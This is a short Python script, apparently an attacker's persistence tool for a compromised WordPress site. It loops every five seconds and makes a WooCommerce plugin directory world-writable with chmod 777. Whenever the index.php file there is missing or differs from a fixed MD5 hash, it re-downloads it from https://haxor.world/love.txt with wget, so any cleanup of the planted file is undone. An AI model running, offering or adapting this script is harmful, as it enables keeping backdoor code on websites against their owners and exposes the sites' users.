import os
import hashlib
import time

def calculate_md5(file_path):
    # Baca isi file dan hitung MD5 hash
    with open(file_path, 'rb') as f:
        data = f.read()
        md5_hash = hashlib.md5(data).hexdigest()
    return md5_hash

def main():
    target_dir = '/home/feb/public_html/wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/filter-wrapper/'
    target_file = os.path.join(target_dir, 'index.php')
    expected_md5 = '196c32a609943a2432ebf17111c69b9a'
    
    while True:
        if os.path.exists(target_dir):
            print("[*] Directory exists")
            # Memeriksa apakah direktori dapat ditulis
            if not os.access(target_dir, os.W_OK):
                print("[!] Directory not writable. Changing permissions.")
                os.chmod(target_dir, 0O777)
                print("[*] Directory permissions changed to 0O777.")
        else:
            print("[!] Directory not found")
            print("[!] Creating directory")
            os.makedirs(target_dir)
            print("[*] Directory created")

        if os.path.exists(target_file):
            print("[*] File exists")
            # Hitung MD5 hash dari file yang ada
            current_md5 = calculate_md5(target_file)
            # Bandingkan dengan MD5 hash yang diharapkan
            if current_md5 != expected_md5:
                print("[!] MD5 hash mismatch. Downloading new content.")
                os.system(f'wget -O {target_file} https://haxor.world/love.txt')
            else:
                print("[*] MD5 hash match. No need to download.")
        else:
            print("[!] File not found")
            print("[!] Creating file")
            os.system(f'wget -O {target_file} https://haxor.world/love.txt')

        time.sleep(5)

main()
